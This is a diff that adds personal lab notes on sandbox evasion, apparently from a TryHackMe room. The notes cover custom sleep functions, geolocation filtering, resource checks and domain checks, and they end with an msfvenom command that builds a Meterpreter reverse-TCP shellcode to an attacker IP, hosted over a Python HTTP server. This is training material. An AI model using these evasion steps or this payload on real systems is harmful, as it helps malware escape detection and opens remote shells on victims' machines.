@@ -1,0 +1,52 @@
+### sandbox evasion ###
+## links ##
+https://tryhackme.com/room/sandboxevasion
+# see /home/tristan/perso/secu/win/weaponization
+
+
+## add a sleeping function ##
+Beware that some sandboxes may alter built-in sleep functions.
+various Anti-Virus vendors have put out blog posts about bypassing built-in sleep functions.
+So it is highly recommended you develop your own sleep function.
+https://evasions.checkpoint.com/techniques/timing.html
+https://www.joesecurity.org/blog/660946897093663167
+
+
+
+## geolocation filter ##
+You may choose to implement a geolocation filter on your program that checks if
+the IP Address block is owned by the company you are targeting or if it is from a residential address space
+https://ifconfig.me/
+https://rdap.arin.net/registry/ip/1.1.1.1
+
+
+
+## check system info ##
+Most Sandboxes typically have reduced resources.
+A popular Malware Sandbox service, Any.Run, only allocates 1 CPU core and 4GB of RAM per virtual machine
+
+
+
+## check network info ##
+Almost no Malware Sandboxes are joined in a domain,
+so it's relatively safe to assume if the machine is not joined to a domain, it is not the right target.
+However, you cannot always be too sure, so you should collect some information about the domain to be safe.
+There are many objects that you can query
+
+Computers
+User accounts
+Last User Login(s)
+Groups
+Domain Admins
+Enterprise Admins
+Domain Controllers
+Service Accounts
+DNS Servers
+
+
+
+## raw shellcode ##
+# be hosted with http python server
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.98.114 LPORT=4444 -f raw -o index.raw
+sudo python3 -m http.server 80
+
